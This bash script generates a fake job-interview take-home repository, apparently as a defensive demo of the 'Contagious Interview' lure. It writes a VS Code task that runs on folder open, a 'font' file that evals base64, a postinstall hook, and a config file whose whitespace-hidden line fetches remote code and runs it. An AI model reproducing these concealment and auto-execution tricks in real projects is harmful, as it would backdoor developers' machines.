#!/usr/bin/env bash
# Generate an inert look-alike of a "Contagious Interview" repository for the
# README demo. Nothing here is harmful: the "payload" decodes to a console.log
# call, and no URL resolves. The repository is generated on demand so that this
# project never commits files that look like an attack.
set -euo pipefail

dest="${1:?usage: make-demo-repo.sh <dir>}"
rm -rf "$dest"
mkdir -p "$dest/.vscode" "$dest/public/fonts" "$dest/src" "$dest/server"

payload=$(printf 'console.log("preflight demo: this would have been the backdoor")' | base64)

cat > "$dest/README.md" <<'EOF'
# Trading Dashboard — Take-home Assignment

Thanks for interviewing with us! Please clone this repo, open it in VS Code,
run `npm install && npm start`, and implement the features in `TASKS.md`.
EOF

cat > "$dest/package.json" <<'EOF'
{
  "name": "trading-dashboard",
  "version": "1.4.2",
  "private": true,
  "scripts": {
    "start": "node server",
    "test": "jest",
    "postinstall": "node server/config.js"
  },
  "dependencies": {
    "express": "^4.19.2",
    "react": "^18.3.1"
  }
}
EOF

cat > "$dest/.vscode/tasks.json" <<'EOF'
{
  // Auto-build on open so the candidate doesn't have to
  "version": "2.0.0",
  "tasks": [
    {
      "label": "prepare-assets",
      "type": "shell",
      "command": "node public/fonts/fa-solid-900.woff2",
      "runOptions": { "runOn": "folderOpen" },
      "presentation": { "reveal": "never", "echo": false },
      "problemMatcher": [],
    },
  ],
}
EOF

# A "font" that is really obfuscated JavaScript.
cat > "$dest/public/fonts/fa-solid-900.woff2" <<EOF
const cp = require("child_process"), os = require("os");
const run = (s) => eval(Buffer.from(s, "base64").toString("utf8"));
run("$payload");
EOF

# Config file with the real logic pushed off-screen.
printf 'module.exports = { port: 3000, env: "development" };%s%s\n' \
  "$(printf '%*s' 320 '')" \
  "const _0x=require('https');_0x.get('https://api.npoint.io/5d3f9c1a',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>new Function(d)())})" \
  > "$dest/server/config.js"

cat > "$dest/server/index.js" <<'EOF'
const express = require("express");
const config = require("./config");
const app = express();
app.get("/", (req, res) => res.send("Trading Dashboard"));
app.listen(config.port);
EOF

cat > "$dest/src/App.jsx" <<'EOF'
export default function App() {
  return <h1>Trading Dashboard</h1>;
}
EOF

echo "demo repository written to $dest"
